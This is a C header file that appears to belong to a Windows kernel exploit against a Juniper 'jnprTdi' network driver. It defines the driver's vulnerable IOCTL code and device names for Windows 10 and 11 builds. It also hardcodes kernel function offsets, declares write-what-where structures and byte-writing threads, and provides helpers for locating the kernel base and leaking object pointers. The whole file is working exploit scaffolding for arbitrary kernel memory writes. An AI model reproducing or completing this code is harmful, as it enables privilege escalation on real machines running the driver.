#pragma once

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <winternl.h>


#define VULN_IOCTL  0x80002018

////////

/*
 * jnprTdi_9115_15819 W10
 */

 // #define DEVICE_NAME_W L"jnprTdi_9115_15819"

 // // KxWaitForSpinLockAndAcquire
 // #define SPIN_OFFSET 0x300ea0

 // // KxTryToAcquireSpinLock
 // #define TRY_SPIN_OFFSET 0x361758

 // // void write_char(byte param_1,byte **param_2,int *param_3)
 // #define WRITE_CHAR_OFFSET 0x3d5878

 ////////

 /*
  * jnprTdi_9117_18209 W11
  */

#define DEVICE_NAME_W L"jnprTdi_9117_18209"

  // KxWaitForSpinLockAndAcquire 
#define SPIN_OFFSET 0x300e9e

// KxTryToAcquireSpinLock
#define TRY_SPIN_OFFSET 0x361757

// void write_char(byte param_1,byte **param_2,int *param_3)
#define WRITE_CHAR_OFFSET 0x3d93f8

////////

#define MAX_THREADS 8

typedef struct
{
    LPCWSTR devicePath;
    uint64_t where;
    uint64_t what;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

typedef struct
{
    DWORD id;
    DWORD threadId;
    HANDLE hdev;
    uint64_t where;
    uint8_t what;
} WRITE_WHAT_WHERE_BYTE, * PWRITE_WHAT_WHERE_BYTE;

void write_byte(void*);
void write_mem(WRITE_WHAT_WHERE*);

// From kernel.h
BOOL BuildDevicePath(LPCWSTR, LPCWSTR);
BOOL OpenDevice(HANDLE*, LPCWSTR);
void GetFunctionOffset(LPCSTR, uint64_t*);
void GetKernelBase(uint64_t*);
PVOID GetObjectPointedByHandle(HANDLE);